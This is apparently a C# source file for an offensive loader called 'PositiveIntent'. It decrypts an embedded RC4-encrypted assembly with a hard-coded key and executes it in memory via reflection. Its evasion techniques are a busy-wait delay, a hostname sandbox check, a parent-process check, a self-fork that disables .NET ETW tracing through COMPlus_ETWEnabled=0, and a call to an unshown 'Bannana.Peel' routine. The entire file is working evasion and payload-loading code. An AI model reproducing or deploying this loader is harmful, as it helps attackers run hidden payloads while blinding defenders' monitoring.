using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Management;
using System.Linq;
using System.IO;

namespace PositiveIntent;

public class Program
{
    static bool GetParentProcess()
    {
        int parentPid = 0;
        int ourPid = Process.GetCurrentProcess().Id;
        using (ManagementObject mo = new ManagementObject("win32_process.handle='" + ourPid.ToString() + "'"))
        {
            mo.Get();
            parentPid = Convert.ToInt32(mo["ParentProcessId"]);
        }
        if (Process.GetProcessById(parentPid).ProcessName == Process.GetCurrentProcess().ProcessName)
        {
            return true;
        }
        else
        {
            return false;
        }
    }
    static void CheckHostname()
    {
        if (System.Environment.MachineName != "TESTVM")
        {
            Environment.Exit(-1);
        }
    }
    static void DelayExecution()
    {
        long current_iteration = 0;
        long target_iterations = 1000000000;
        while (current_iteration != target_iterations)
        {
            current_iteration++;
        }
    }
    // TODO: sandbox check via hostname
    static void Fork(string args)
    {
        Process p = new Process();
        p.StartInfo.FileName = Process.GetCurrentProcess().ProcessName;
        p.StartInfo.Arguments = args;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.EnvironmentVariables["COMPlus_ETWEnabled"] = "0";
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        //Environment.SetEnvironmentVariable("CO" + "MP" + "lus" + "_ETWE" + "nab" + "led", "0");
        p.Start();
        Console.WriteLine(p.StandardOutput.ReadToEnd());
        Console.WriteLine(p.StandardError.ReadToEnd());
        p.WaitForExit();
    }

    static void LoadAssembly(string[] args)
    {
        byte[] eassembly = Properties.Resources.File1;
        byte[] key = System.Text.Encoding.UTF8.GetBytes("DepthSecurity");

        RC4 rc4 = new RC4(key);

        // Decrypt (RC4 uses the same method for encryption and decryption)
        byte[] dassembly = rc4.EncryptDecrypt(eassembly);

        Assembly assembly = Assembly.Load(dassembly);
        //Find the Entrypoint or "Main" method
        MethodInfo method = assembly.EntryPoint;
        //Get Parameters
        //object[] parameters = new[] { new string[] { "triage" } };
        object[] parameters = new[] { args };
        //Invoke the method with the specified parameters
        object execute = method.Invoke(null, parameters);
    }

    public static void Main(string[] args)
    {
        if (GetParentProcess())
        {
            DelayExecution();
            Bannana.Peel();
            LoadAssembly(args);
        }
        else if (args.Length != 0)
        {
            CheckHostname();
            DelayExecution();
            Fork(string.Join(" ", args));
        }
    }
}